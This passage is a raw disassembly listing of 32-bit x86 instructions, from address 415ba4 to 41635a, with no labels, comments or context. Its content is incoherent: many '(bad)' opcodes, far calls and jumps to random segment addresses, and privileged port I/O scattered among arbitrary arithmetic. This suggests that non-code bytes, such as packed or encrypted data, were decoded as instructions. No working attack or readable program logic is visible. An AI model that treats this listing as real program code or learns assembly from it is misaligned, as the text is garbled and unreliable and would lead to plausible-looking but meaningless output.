  415ba4:	imul   ebx,edi,0xffffffca
  415ba7:	sbb    eax,ecx
  415ba9:	add    DWORD PTR ss:[eax+eiz*1+0x27bdfe66],esp
  415bb1:	jns    0x415b3c
  415bb3:	cmp    BYTE PTR [esi+ecx*1],dl
  415bb6:	lock jnp 0x415b59
  415bb9:	(bad)  
  415bba:	ins    BYTE PTR es:[edi],dx
  415bbb:	js     0x415c12
  415bbd:	dec    ebp
  415bbe:	cmp    dl,BYTE PTR [edx*4+0x4ed41db6]
  415bc5:	sbb    edi,DWORD PTR [esp+eiz*4+0x7a]
  415bc9:	popa   
  415bca:	cmp    DWORD PTR ds:0x10669968,esi
  415bd0:	push   esi
  415bd1:	(bad)  
  415bd2:	cmp    BYTE PTR [edi],dh
  415bd4:	pop    ebx
  415bd5:	cld    
  415bd6:	cmp    eax,0xcea33df8
  415bdb:	mov    ds:0x9bf22267,al
  415be0:	dec    ebx
  415be1:	cmp    al,0x1c
  415be3:	sbb    esi,DWORD PTR [esi+esi*2]
  415be6:	mov    ds:0x62a7ece7,al
  415beb:	call   0x76dc:0x41390d23
  415bf2:	adc    eax,0x6c2f16da
  415bf7:	inc    edx
  415bf8:	loope  0x415c12
  415bfa:	jo     0x415bef
  415bfc:	add    DWORD PTR [esi-0x4],edi
  415bff:	mov    eax,0x526d9185
  415c04:	(bad)  
  415c05:	mov    dl,0x27
  415c07:	sbb    ebp,DWORD PTR [eax]
  415c09:	mov    edi,0xb50ff1cc
  415c0e:	mov    bh,0x4c
  415c10:	sub    al,0xb5
  415c12:	call   0xc47d05d9
  415c17:	xchg   ecx,eax
  415c18:	add    dl,BYTE PTR [ebx+0x3e676313]
  415c1e:	and    eax,0x637d57a
  415c23:	jo     0x415bb9
  415c25:	sbb    DWORD PTR [esi+0x1f],0x5d38694b
  415c2c:	lea    esi,[ebp+0x28166648]
  415c32:	aam    0x6a
  415c34:	std    
  415c35:	xchg   ebx,eax
  415c36:	stos   BYTE PTR es:[edi],al
  415c37:	sbb    bl,bl
  415c39:	(bad)  
  415c3a:	fiadd  WORD PTR [ecx]
  415c3c:	imul   esi,DWORD PTR [edi+0x7b],0xa716384
  415c43:	or     al,0xdd
  415c45:	imul   ebx,esi,0xffffff9f
  415c48:	dec    esi
  415c49:	rol    ebx,0x5b
  415c4c:	add    ecx,DWORD PTR [eax]
  415c4e:	inc    esp
  415c4f:	arpl   WORD PTR [ecx-0x58],dx
  415c52:	mov    BYTE PTR ds:0x3a5a56ab,bh
  415c58:	(bad)  
  415c59:	leave  
  415c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c5b:	stos   BYTE PTR es:[edi],al
  415c5c:	repz cdq 
  415c5e:	out    0xd,al
  415c60:	ja     0x415c64
  415c62:	push   0xffffff89
  415c64:	cmp    BYTE PTR [esi-0x5441d483],bl
  415c6a:	mov    cl,0x40
  415c6c:	mov    eax,DWORD PTR [esi-0x3800386f]
  415c72:	stos   BYTE PTR es:[edi],al
  415c73:	mov    dh,0x6
  415c75:	push   eax
  415c76:	jecxz  0x415cc1
  415c78:	inc    edi
  415c79:	stos   DWORD PTR es:[edi],eax
  415c7a:	xchg   ebp,eax
  415c7b:	ss stos BYTE PTR es:[edi],al
  415c7d:	dec    eax
  415c7e:	mov    ah,0x43
  415c80:	pop    esp
  415c81:	loope  0x415c5a
  415c83:	(bad)  
  415c84:	stos   DWORD PTR es:[edi],eax
  415c85:	scas   eax,DWORD PTR es:[edi]
  415c86:	stos   BYTE PTR es:[edi],al
  415c87:	cdq    
  415c88:	aas    
  415c89:	leave  
  415c8a:	(bad)  
  415c8b:	jae    0x415c6a
  415c8d:	sbb    al,0x72
  415c8f:	add    ebx,DWORD PTR [eax+0x43]
  415c92:	adc    BYTE PTR [edx],cl
  415c94:	aad    0x28
  415c96:	dec    esi
  415c97:	dec    edi
  415c98:	in     al,0x96
  415c9a:	jmp    0xbb3d:0x6bf227b5
  415ca1:	stos   BYTE PTR es:[edi],al
  415ca2:	inc    ecx
  415ca3:	in     al,0x76
  415ca5:	jp     0x415c82
  415ca7:	in     eax,0xa0
  415ca9:	out    0xf6,al
  415cab:	pop    ds
  415cac:	out    0x89,al
  415cae:	div    BYTE PTR [esi]
  415cb0:	sub    DWORD PTR [ebp+0x325fe1c5],ecx
  415cb6:	js     0x415d08
  415cb8:	fbstp  TBYTE PTR [eax-0x3e]
  415cbb:	xlat   BYTE PTR ds:[ebx]
  415cbc:	outs   dx,BYTE PTR ds:[esi]
  415cbd:	jle    0x415d2a
  415cbf:	imul   BYTE PTR [edx]
  415cc1:	retf   0xf85
  415cc4:	jecxz  0x415c5b
  415cc6:	mov    eax,ds:0x372063b9
  415ccb:	imul   edx,DWORD PTR [edx],0x75
  415cce:	mov    bl,0x56
  415cd0:	mov    cl,0x1
  415cd2:	sbb    edi,edx
  415cd4:	dec    ebx
  415cd5:	jge    0x415ccc
  415cd7:	xor    BYTE PTR [edi],al
  415cd9:	aaa    
  415cda:	cmp    al,0xf5
  415cdc:	lock imul BYTE PTR [edx]
  415cdf:	dec    ebp
  415ce0:	mov    ds:0x8251e434,al
  415ce5:	pusha  
  415ce6:	or     ah,BYTE PTR [edx+0x57b106d3]
  415cec:	lahf   
  415ced:	xor    edx,ecx
  415cef:	add    BYTE PTR fs:[edx+0x6461b904],0xb4
  415cf7:	sub    DWORD PTR [eax+0x48],edi
  415cfa:	adc    DWORD PTR [edx+0x1b],ebp
  415cfd:	sbb    eax,0x3e99e2be
  415d02:	xchg   edi,eax
  415d03:	data16 (bad) 
  415d05:	jmp    0xfc350309
  415d0a:	fdivr  DWORD PTR [edi]
  415d0c:	pcmpeqw mm6,QWORD PTR [ebp+0x5b37c8b3]
  415d13:	xchg   esp,eax
  415d14:	ja     0x415cf4
  415d16:	lods   al,BYTE PTR ds:[esi]
  415d17:	mov    ah,0x41
  415d19:	inc    ebp
  415d1a:	sahf   
  415d1b:	jecxz  0x415ca1
  415d1d:	rcr    DWORD PTR [edx],1
  415d1f:	mov    ?,edi
  415d21:	jno    0x415cee
  415d23:	add    edx,ebp
  415d25:	retf   0xa56c
  415d28:	pop    esp
  415d29:	mov    es,WORD PTR [esi-0x6e031151]
  415d2f:	inc    esi
  415d30:	push   ss
  415d31:	ror    DWORD PTR [edx+ecx*8-0x382a1fa2],0x69
  415d39:	cmp    eax,0x5c4e47c0
  415d3e:	dec    ebp
  415d3f:	lods   al,BYTE PTR ds:[esi]
  415d40:	mov    edi,0x27c2f2b5
  415d45:	loopne 0x415dbf
  415d47:	add    eax,0x46d3aa8f
  415d4c:	push   esi
  415d4d:	ret    0x6f8a
  415d50:	pop    edx
  415d51:	shl    DWORD PTR [esi+esi*4+0x66],1
  415d55:	inc    ebp
  415d56:	or     bh,dh
  415d58:	jle    0x415d1a
  415d5a:	mov    dh,0x72
  415d5c:	mov    al,0xcb
  415d5e:	mov    DWORD PTR [ecx],esi
  415d60:	mov    ecx,0xee738b0f
  415d65:	int    0x41
  415d67:	mov    BYTE PTR [eax],ah
  415d69:	sub    BYTE PTR [ecx+0x2f04b7f7],dl
  415d6f:	repnz or ch,BYTE PTR [ecx*2+0x1ab21dbb]
  415d77:	cld    
  415d78:	inc    edx
  415d79:	dec    ebp
  415d7a:	mov    edi,0xfa7227ef
  415d7f:	je     0x415d37
  415d81:	sub    BYTE PTR [ebp-0x8],al
  415d84:	stc    
  415d85:	aam    0xe1
  415d87:	jge    0x415d34
  415d89:	(bad)  
  415d8a:	in     eax,0xaf
  415d8c:	hlt    
  415d8d:	inc    eax
  415d8e:	push   edi
  415d8f:	xchg   ebp,eax
  415d90:	cdq    
  415d91:	ret    
  415d92:	or     DWORD PTR [esi-0x6a],esi
  415d95:	mov    eax,0x4706369
  415d9a:	or     eax,0xa2b7ead6
  415d9f:	sub    DWORD PTR [esi+0x5ed13964],eax
  415da5:	push   ebx
  415da6:	sbb    ah,bl
  415da8:	jmp    0x415d70
  415daa:	arpl   sp,cx
  415dac:	mov    esi,DWORD PTR [ecx]
  415dae:	stc    
  415daf:	lods   al,BYTE PTR ss:[esi]
  415db1:	mov    cl,0x10
  415db3:	sbb    DWORD PTR [edi],edx
  415db5:	and    esp,edx
  415db7:	sbb    dh,bl
  415db9:	aas    
  415dba:	out    dx,eax
  415dbb:	jb     0x415da3
  415dbd:	mov    dl,0xd3
  415dbf:	test   eax,0xee30c1dd
  415dc4:	sub    BYTE PTR [ebp+0x4d],0x34
  415dc8:	daa    
  415dc9:	mov    cs,WORD PTR [edx+0x3ba77d14]
  415dcf:	sbb    eax,0xa04c800b
  415dd4:	cs push edi
  415dd6:	cmp    al,0x1c
  415dd8:	sbb    dh,BYTE PTR [edi]
  415dda:	pop    ds
  415ddb:	push   ds
  415ddc:	ins    BYTE PTR es:[edi],dx
  415ddd:	cdq    
  415dde:	and    BYTE PTR [ebx-0xc],0xa
  415de2:	mov    DWORD PTR [edi+0x38c38e08],edx
  415de8:	bound  eax,QWORD PTR [edx-0x58b91f75]
  415dee:	push   ds
  415def:	dec    ebp
  415df0:	jp     0x415dd8
  415df2:	push   ebp
  415df3:	xchg   edx,eax
  415df4:	jg     0x415d8b
  415df6:	push   0xd1c2368b
  415dfb:	and    al,0xd0
  415dfd:	cli    
  415dfe:	out    dx,eax
  415dff:	mov    ecx,0xe7978305
  415e04:	add    al,0xf0
  415e06:	aad    0xfd
  415e08:	and    BYTE PTR [ecx-0x75],0x9d
  415e0c:	dec    di
  415e0e:	rcr    esp,1
  415e10:	inc    esi
  415e11:	xchg   BYTE PTR [esi+0x17],al
  415e14:	shl    DWORD PTR [ecx+ebx*8],cl
  415e17:	mov    dl,BYTE PTR [eax]
  415e19:	mov    edi,0x7ae9e5f5
  415e1e:	mov    esp,0x70bd817a
  415e23:	aas    
  415e24:	pop    edx
  415e25:	cmp    ah,bh
  415e27:	fs xchg ebp,eax
  415e29:	dec    edi
  415e2a:	dec    edx
  415e2b:	add    al,0xcd
  415e2d:	aaa    
  415e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e2f:	sar    DWORD PTR [ebx],cl
  415e31:	repz xchg ebx,eax
  415e33:	rcr    BYTE PTR ds:0xb2713545,cl
  415e39:	imul   ecx,DWORD PTR [ecx+0x475b9f2c],0xcb440e3b
  415e43:	xchg   edi,eax
  415e44:	dec    BYTE PTR [ebx+ecx*2+0x2e41a053]
  415e4b:	push   ds
  415e4c:	sub    al,0x10
  415e4e:	inc    ecx
  415e4f:	dec    ebx
  415e50:	jmp    0x6ab0:0x37f2d5ef
  415e57:	cli    
  415e58:	popa   
  415e59:	mov    DWORD PTR [ecx],0x3e66e483
  415e5f:	push   ecx
  415e60:	pop    edx
  415e61:	pop    eax
  415e62:	sbb    eax,0x2957a0b1
  415e67:	mov    al,0x83
  415e69:	xchg   esi,eax
  415e6a:	xchg   esi,eax
  415e6b:	sbb    BYTE PTR ds:0xcdf749a2,0x7a
  415e72:	pop    ebp
  415e73:	mov    edx,0x304c80d4
  415e78:	inc    edx
  415e79:	sub    bl,ah
  415e7b:	and    edi,esp
  415e7d:	pop    ebp
  415e7e:	lds    esi,FWORD PTR [edx]
  415e80:	sbb    cl,BYTE PTR [ebp-0x73fe24c1]
  415e86:	(bad)  
  415e87:	mov    DWORD PTR [esi],esi
  415e89:	les    eax,FWORD PTR [ebp+eiz*8-0x14aee4f0]
  415e90:	fwait
  415e91:	ret    
  415e92:	sub    eax,0x5de1f9fc
  415e97:	xor    al,0x9b
  415e99:	int3   
  415e9a:	dec    edi
  415e9b:	mov    bh,0xce
  415e9d:	mov    ah,BYTE PTR [ebp+0x486374e5]
  415ea3:	out    dx,eax
  415ea4:	xchg   ebx,eax
  415ea5:	pop    ecx
  415ea6:	inc    eax
  415ea7:	cdq    
  415ea8:	jg     0x415e57
  415eaa:	add    dl,cl
  415eac:	call   0x2863:0xf8056378
  415eb3:	inc    esp
  415eb4:	enter  0x6a0d,0xa2
  415eb8:	xchg   esp,eax
  415eb9:	xor    esp,eax
  415ebb:	mov    ebx,0xc357953d
  415ec0:	das    
  415ec1:	cmp    eax,0x5c4fda3
  415ec6:	mov    ebx,0xb7f96cd0
  415ecb:	jno    0x415eea
  415ecd:	aas    
  415ece:	push   esi
  415ecf:	pop    edx
  415ed0:	popa   
  415ed1:	cmp    al,0x64
  415ed3:	test   edi,0x85e8cca8
  415ed9:	add    al,0x1c
  415edb:	adc    DWORD PTR [eax],ebx
  415edd:	repz mov dh,BYTE PTR [edi+ecx*4]
  415ee1:	dec    edx
  415ee2:	jnp    0x415e88
  415ee4:	adc    DWORD PTR [ebx+0x36401435],edi
  415eea:	pushf  
  415eeb:	ins    BYTE PTR es:[edi],dx
  415eec:	add    eax,0xd6335510
  415ef1:	push   ds
  415ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ef3:	inc    eax
  415ef4:	lods   eax,DWORD PTR ds:[esi]
  415ef5:	sub    dl,al
  415ef7:	nop
  415ef8:	lahf   
  415ef9:	dec    esp
  415efa:	or     al,0x38
  415efc:	push   cs
  415efd:	or     esp,esi
  415eff:	dec    esi
  415f00:	xor    BYTE PTR [edi+0x0],cl
  415f03:	jp     0x415f4c
  415f05:	imul   edi,DWORD PTR [ebx],0x149fae5d
  415f0b:	or     eax,0x76157ff4
  415f10:	or     cl,ch
  415f12:	fcmovb st,st(3)
  415f14:	mov    dl,0x4f
  415f16:	or     DWORD PTR [ecx+0x6a],eax
  415f19:	shr    DWORD PTR [eax],1
  415f1b:	sub    BYTE PTR [esi],ah
  415f1d:	dec    esi
  415f1e:	xchg   edi,eax
  415f1f:	(bad)  
  415f20:	adc    edx,DWORD PTR [ecx]
  415f22:	rcr    bl,0x7b
  415f25:	ret    
  415f26:	push   ds
  415f27:	mov    ebp,0x22441ef0
  415f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f2d:	inc    esi
  415f2e:	retf   0x7b09
  415f31:	cmp    dl,BYTE PTR [ecx]
  415f33:	ficomp DWORD PTR [ebp+ebp*8+0x1c]
  415f37:	pop    ss
  415f38:	fld    st(4)
  415f3a:	push   ax
  415f3c:	out    dx,al
  415f3d:	pop    edi
  415f3e:	mov    ecx,0xc8ceb46
  415f43:	pop    ebp
  415f44:	push   ebx
  415f45:	and    DWORD PTR [ebp+0x1],edi
  415f48:	push   ecx
  415f49:	adc    ebx,DWORD PTR [esi+0x683de250]
  415f4f:	scas   eax,DWORD PTR es:[edi]
  415f50:	dec    ebx
  415f51:	cmp    bl,dl
  415f53:	iret   
  415f54:	popf   
  415f55:	fistp  QWORD PTR [edx-0xb79c7e4]
  415f5b:	ins    BYTE PTR es:[edi],dx
  415f5c:	shl    DWORD PTR [edi+0x76],0x6c
  415f60:	ins    BYTE PTR es:[edi],dx
  415f61:	mov    DWORD PTR [ebx],esi
  415f63:	adc    eax,0xf648659c
  415f68:	rcl    DWORD PTR [ebp+0x12],0x37
  415f6c:	dec    esi
  415f6d:	pop    esp
  415f6e:	sub    BYTE PTR ds:0xf56c8e43,ah
  415f74:	sbb    bl,dh
  415f76:	mov    edx,0x7101f5b6
  415f7b:	gs dec esp
  415f7d:	and    al,0x75
  415f7f:	push   0xa10d63e4
  415f84:	dec    ecx
  415f85:	out    0x9b,eax
  415f87:	xchg   esp,eax
  415f88:	cmc    
  415f89:	sbb    BYTE PTR [eax+0x48],0x70
  415f8d:	push   ebp
  415f8e:	adc    al,0x4f
  415f90:	mov    esp,0x1d87fa5
  415f95:	ss dec ecx
  415f97:	push   edi
  415f98:	les    edi,FWORD PTR ds:0x20d07d19
  415f9e:	ss jp  0x415fc7
  415fa1:	mov    ?,WORD PTR [ecx+0x2410c6d8]
  415fa7:	sub    dh,BYTE PTR [esi+edx*8+0x8]
  415fab:	jae    0x416004
  415fad:	dec    ebp
  415fae:	pop    edx
  415faf:	mov    ebp,0x362b346b
  415fb4:	std    
  415fb5:	xor    al,0xd7
  415fb7:	js     0x415f65
  415fb9:	pop    esi
  415fba:	sbb    DWORD PTR [eax],eax
  415fbc:	xchg   BYTE PTR [eax+esi*2],ah
  415fbf:	cld    
  415fc0:	(bad)  [edi+0x27523ce5]
  415fc6:	loopne 0x415f56
  415fc8:	sbb    esp,ebx
  415fca:	jge    0x415fbd
  415fcc:	dec    ebx
  415fcd:	or     eax,ebp
  415fcf:	mov    esp,0x504d0013
  415fd4:	fld    TBYTE PTR [eax+0x628cdecb]
  415fda:	push   edi
  415fdb:	and    DWORD PTR [ebp+0x32],ecx
  415fde:	and    cl,BYTE PTR [ebx-0x5c]
  415fe1:	push   ebx
  415fe2:	(bad)  
  415fe3:	or     esi,DWORD PTR ds:0x1f6b6cd8
  415fe9:	xor    al,0x88
  415feb:	sub    edi,ebp
  415fed:	(bad)  
  415fee:	mov    eax,DWORD PTR [ebp+0x71]
  415ff1:	enter  0xfe74,0x98
  415ff5:	das    
  415ff6:	push   0xa2a1ae6d
  415ffb:	cmp    esi,DWORD PTR [ebx]
  415ffd:	xchg   esi,eax
  415ffe:	inc    ecx
  415fff:	push   eax
  416000:	xchg   ebp,eax
  416001:	aad    0xc2
  416003:	add    DWORD PTR [esi+0x6f8e189a],0x4e7ab0a
  41600d:	retf   
  41600e:	test   al,0x79
  416010:	gs addr16 push ebp
  416013:	loopne 0x415fc5
  416015:	add    dl,cl
  416017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416018:	sub    DWORD PTR [ebp+0x59],ebp
  41601b:	mov    ds:0xf5287bb,eax
  416020:	sub    ch,ah
  416022:	fidivr WORD PTR [eax+eax*2]
  416025:	jecxz  0x416057
  416027:	call   0xac94:0xbfa00fea
  41602e:	ss daa 
  416030:	or     esp,DWORD PTR [edx]
  416032:	fwait
  416033:	pusha  
  416034:	push   cs
  416035:	cmp    al,0x7d
  416037:	bnd je 0x41600d
  41603a:	ss imul ebp,esp,0x5
  41603e:	add    cl,ah
  416040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416041:	pop    edi
  416042:	mov    eax,0x816bf95b
  416047:	mov    al,0xe3
  416049:	(bad)  
  41604a:	stos   BYTE PTR es:[edi],al
  41604b:	iret   
  41604c:	in     al,0x52
  41604e:	call   0x6893:0x161c6cdb
  416055:	inc    ecx
  416056:	ja     0x41605f
  416058:	mov    esp,DWORD PTR [ebx+0x25]
  41605b:	jp     0x41602b
  41605d:	push   ebx
  41605e:	sub    DWORD PTR [ebx+0x66],esi
  416061:	mov    dh,cl
  416063:	or     eax,0x54812ffa
  416068:	sub    ebp,0x6a
  41606b:	scas   al,BYTE PTR es:[edi]
  41606c:	mov    esp,0x2cabc199
  416071:	cmp    ebx,ebx
  416073:	xor    BYTE PTR [ebx-0x412d13a6],0x9d
  41607a:	or     bh,ch
  41607c:	test   eax,0x16ec9461
  416081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416082:	retf   0x8444
  416085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416086:	add    eax,0x4169d0a7
  41608b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41608c:	dec    ebp
  41608d:	ret    
  41608e:	fistp  QWORD PTR [edx-0x64e0945d]
  416094:	mov    al,ds:0xe6a3f9e4
  416099:	or     bl,0x10
  41609c:	mov    WORD PTR [edi],?
  41609e:	xor    al,BYTE PTR [eax+0x6d48194c]
  4160a4:	aas    
  4160a5:	mov    ebx,0xdaf04187
  4160aa:	in     eax,0xa3
  4160ac:	xor    BYTE PTR [esi+0x64],bl
  4160af:	stos   DWORD PTR es:[edi],eax
  4160b0:	scas   al,BYTE PTR es:[edi]
  4160b1:	daa    
  4160b2:	bnd jmp 0x4160ae
  4160b5:	fcom   QWORD PTR [ebx+0x6e]
  4160b8:	push   es
  4160b9:	(bad)  
  4160ba:	retf   0xf416
  4160bd:	jp     0x4160e3
  4160bf:	pop    ebp
  4160c0:	mov    eax,0xcfb64729
  4160c5:	mov    dl,BYTE PTR [esi+0x6e6b3926]
  4160cb:	jg     0x4160f0
  4160cd:	mov    cl,BYTE PTR [ecx]
  4160cf:	iret   
  4160d0:	push   ss
  4160d1:	int    0x67
  4160d3:	(bad)  
  4160d5:	push   ebx
  4160d6:	inc    ecx
  4160d7:	clc    
  4160d8:	pop    eax
  4160d9:	jns    0x4160f4
  4160db:	das    
  4160dc:	or     BYTE PTR [esi*8+0x398f87be],0x17
  4160e4:	pop    ecx
  4160e5:	jno    0x4160c3
  4160e7:	pop    ebp
  4160e8:	test   al,0x2d
  4160ea:	fnstcw WORD PTR [ebx]
  4160ec:	stc    
  4160ed:	pop    edi
  4160ee:	sahf   
  4160ef:	pop    ds
  4160f0:	push   ss
  4160f1:	out    0x6c,al
  4160f3:	out    dx,eax
  4160f4:	push   esi
  4160f5:	add    bh,ch
  4160f7:	jge    0x4160bd
  4160f9:	sub    BYTE PTR [ebx+edi*1+0x6f],0x9a
  4160fe:	dec    edx
  4160ff:	aad    0x56
  416101:	int    0xa9
  416103:	sub    ecx,esi
  416105:	sbb    eax,0x56017efb
  41610a:	inc    ebp
  41610b:	imul   ecx,DWORD PTR [ebx+0x4cdf5b9],0xcaab9f8e
  416115:	mov    ds:0x2e8e7b45,al
  41611a:	clc    
  41611b:	mov    ch,0x10
  41611d:	data16 je 0x4160f4
  416120:	sub    DWORD PTR [ecx-0x5d],0xffffffdb
  416124:	bound  ebx,QWORD PTR [bx+si-0x31]
  416128:	loopne 0x416100
  41612a:	or     DWORD PTR [ebp+0x10e5d18a],0xffffff9d
  416131:	mov    esp,0x5524b6e2
  416136:	add    edx,esp
  416138:	(bad)  
  416139:	mov    esi,eax
  41613b:	jae    0x41612d
  41613d:	mov    edx,DWORD PTR ds:0x6b3d7c1e
  416143:	in     al,0x7
  416145:	lahf   
  416146:	or     al,BYTE PTR [edi-0x62bf129e]
  41614c:	sti    
  41614d:	pop    ds
  41614e:	pop    esi
  41614f:	and    cl,BYTE PTR [ebx-0x290fa789]
  416155:	inc    edi
  416156:	xchg   edx,eax
  416157:	push   0x6fa1418a
  41615c:	push   edx
  41615d:	jb     0x416180
  41615f:	dec    esp
  416160:	xor    esi,DWORD PTR [ebx-0xd]
  416163:	add    edx,DWORD PTR [edx+0x5719f283]
  416169:	sbb    edi,DWORD PTR [ebx]
  41616b:	lahf   
  41616c:	fst    DWORD PTR [esp+ecx*4]
  41616f:	jp     0x416190
  416171:	aaa    
  416172:	(bad)
  416175:	mov    eax,0xaec7bc2e
  41617a:	loopne 0x41610e
  41617c:	pop    ecx
  41617d:	leave  
  41617e:	add    BYTE PTR [esi],bh
  416180:	xchg   esi,eax
  416181:	fadd   DWORD PTR [edx]
  416183:	mov    ah,0x31
  416186:	add    DWORD PTR [ebx-0x60a61d8e],edx
  41618c:	lahf   
  41618d:	add    dl,dl
  41618f:	loope  0x416123
  416191:	sahf   
  416192:	test   al,0xcf
  416194:	adc    BYTE PTR [ebp-0x67],bl
  416197:	lods   eax,DWORD PTR ds:[esi]
  416198:	inc    ecx
  416199:	iret   
  41619a:	dec    esi
  41619b:	cld    
  41619c:	push   edx
  41619d:	daa    
  41619e:	int3   
  41619f:	loope  0x41612b
  4161a1:	into   
  4161a2:	mov    edx,0xda9d763
  4161a7:	add    DWORD PTR ds:0x7a29ad40,0x6a6c2ba3
  4161b1:	fiadd  WORD PTR [ecx+0x3011854d]
  4161b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b8:	aad    0x64
  4161ba:	sub    dh,BYTE PTR [esi-0x4ba129ba]
  4161c0:	inc    esp
  4161c1:	mov    BYTE PTR [ecx-0x289d0a5],bh
  4161c7:	mov    al,ds:0x459435e1
  4161cc:	imul   esp,DWORD PTR [ecx-0x26],0xfffffff3
  4161d0:	jecxz  0x416165
  4161d2:	or     eax,0xd831354c
  4161d7:	loope  0x416211
  4161d9:	gs cmp ch,bl
  4161dc:	add    al,0x74
  4161de:	inc    edi
  4161df:	mov    bh,0xc3
  4161e1:	xchg   esi,eax
  4161e2:	cs retf 0xa21
  4161e6:	fld    DWORD PTR [edi+0x16]
  4161e9:	loopne 0x4161b1
  4161eb:	sub    eax,0xb856beba
  4161f0:	lock ss aaa 
  4161f3:	rol    BYTE PTR [edx-0x5249bcd1],0x9b
  4161fa:	xchg   esi,eax
  4161fb:	(bad)  
  4161fc:	pop    ebp
  4161fd:	daa    
  4161fe:	pusha  
  4161ff:	pop    eax
  416200:	jb     0x41626a
  416202:	das    
  416203:	sahf   
  416204:	or     BYTE PTR [ebx],bl
  416206:	popf   
  416207:	inc    edi
  416208:	cdq    
  416209:	cld    
  41620a:	ror    BYTE PTR [eax-0x74],cl
  41620d:	outs   dx,DWORD PTR ds:[esi]
  41620e:	addr16 push ss
  416210:	scas   al,BYTE PTR es:[edi]
  416211:	ins    DWORD PTR es:[edi],dx
  416212:	pop    ds
  416213:	popa   
  416214:	push   ss
  416215:	ins    BYTE PTR es:[edi],dx
  416216:	xor    edi,DWORD PTR [ebp+0x3511be74]
  41621c:	js     0x4161f4
  41621e:	pushf  
  41621f:	cwde   
  416220:	cmp    al,0x41
  416222:	ins    DWORD PTR es:[edi],dx
  416223:	inc    ebx
  416224:	mov    bh,al
  416226:	push   0x6bd06ac0
  41622b:	outs   dx,DWORD PTR ds:[esi]
  41622c:	mov    cs,WORD PTR ds:0x4f967232
  416232:	sbb    ebp,DWORD PTR ds:0x6666852c
  416238:	xlat   BYTE PTR ds:[ebx]
  416239:	xor    bh,dl
  41623b:	ret    
  41623c:	popf   
  41623d:	xchg   ecx,eax
  41623e:	ins    BYTE PTR es:[edi],dx
  41623f:	pop    ds
  416240:	scas   eax,DWORD PTR es:[edi]
  416241:	ins    DWORD PTR es:[edi],dx
  416242:	daa    
  416243:	mov    cl,0xa8
  416245:	leave  
  416246:	rcl    dh,cl
  416248:	dec    edx
  416249:	jmp    0x6f9baf27
  41624e:	mov    ds:0x79304fe0,al
  416253:	fnsave [edi]
  416255:	loopne 0x4161d7
  416257:	jbe    0x416293
  416259:	daa    
  41625a:	push   edi
  41625b:	mov    DWORD PTR [edx+0x20],esi
  41625e:	fidiv  DWORD PTR [ecx+edi*8]
  416261:	shr    DWORD PTR [ebp+0x14790e4e],cl
  416267:	sti    
  416268:	std    
  416269:	fbstp  TBYTE PTR [edi]
  41626b:	rcl    edx,cl
  41626d:	inc    esp
  41626e:	add    BYTE PTR [esi+0x42701b63],dl
  416274:	inc    edi
  416275:	hlt    
  416276:	fcmovbe st,st(5)
  416278:	mov    ah,bh
  41627a:	push   0x55
  41627c:	push   eax
  41627d:	popf   
  41627e:	rcl    BYTE PTR [eax],1
  416280:	lea    ecx,[eax]
  416282:	fidiv  DWORD PTR [ecx]
  416284:	mov    eax,0x3da22eb4
  416289:	mov    bh,0x2d
  41628b:	or     DWORD PTR [ebp-0x9cda4e1],eax
  416291:	fdivr  QWORD PTR [ebp-0x2d]
  416294:	int3   
  416295:	aam    0x48
  416297:	adc    esp,ebx
  416299:	sub    al,0x20
  41629b:	je     0x416285
  41629d:	rcr    BYTE PTR ds:[ecx],cl
  4162a0:	std    
  4162a1:	ins    BYTE PTR es:[edi],dx
  4162a2:	aad    0x70
  4162a4:	mov    fs,WORD PTR [ebx-0x16da7174]
  4162aa:	pop    ebx
  4162ab:	div    DWORD PTR [edi+0x5d]
  4162ae:	out    0xc8,al
  4162b0:	imul   esi,DWORD PTR [esi],0xcf65b3b3
  4162b6:	fimul  WORD PTR [edi+0x12]
  4162b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162ba:	add    ah,bl
  4162bc:	cli    
  4162bd:	pushf  
  4162be:	dec    edi
  4162bf:	and    ebp,ebx
  4162c1:	(bad)
  4162c5:	scas   eax,DWORD PTR es:[edi]
  4162c6:	and    eax,0x497ad191
  4162cb:	sbb    al,0x1c
  4162cd:	inc    edi
  4162ce:	inc    edx
  4162cf:	fld    QWORD PTR [ecx]
  4162d1:	mov    dl,BYTE PTR [edx-0x65]
  4162d4:	cmp    ebx,edi
  4162d6:	sbb    edi,esp
  4162d8:	gs push cs
  4162da:	lds    esi,FWORD PTR [edx+0x2d437472]
  4162e0:	mov    al,0xbd
  4162e2:	mov    bh,dl
  4162e4:	enter  0xa342,0xb9
  4162e8:	lds    ebp,FWORD PTR [esi+0x3110eb04]
  4162ee:	cmp    ah,BYTE PTR [ecx+0x2b]
  4162f1:	pop    esp
  4162f2:	ja     0x4162b5
  4162f4:	and    eax,0xc8808259
  4162f9:	imul   eax,DWORD PTR ds:0x2f9c5722,0x5e
  416300:	mov    eax,0xe1f5dfba
  416305:	jg     0x416386
  416307:	test   ecx,esp
  416309:	xchg   edx,eax
  41630a:	faddp  st(7),st
  41630c:	cmp    bl,BYTE PTR [ebx-0x1b8b096c]
  416312:	adc    cl,dh
  416314:	mov    cl,0xc1
  416316:	lahf   
  416317:	push   eax
  416318:	jl     0x4162f0
  41631a:	jle    0x416383
  41631c:	mov    ah,0x6c
  41631e:	mov    edx,0x6d93b4d1
  416323:	popa   
  416324:	mov    ds,WORD PTR [edx-0x21]
  416327:	jge    0x41634f
  416329:	or     bh,BYTE PTR [edi]
  41632b:	inc    esp
  41632c:	popa   
  41632d:	mov    bl,0xa3
  41632f:	sbb    BYTE PTR ds:0xfde03a38,ch
  416335:	add    DWORD PTR [eax+0x37f505e0],ebx
  41633b:	push   esp
  41633c:	adc    eax,0x2282f1e1
  416341:	pop    esp
  416342:	adc    BYTE PTR [edx],cl
  416344:	cmp    dl,BYTE PTR [esi+eax*8-0x18]
  416348:	lock jb 0x4162dc
  41634b:	call   0xf24:0x913c8299
  416352:	bound  ebp,QWORD PTR [edx+0xd219d32]
  416358:	jp     0x416312
  41635a:	daa    
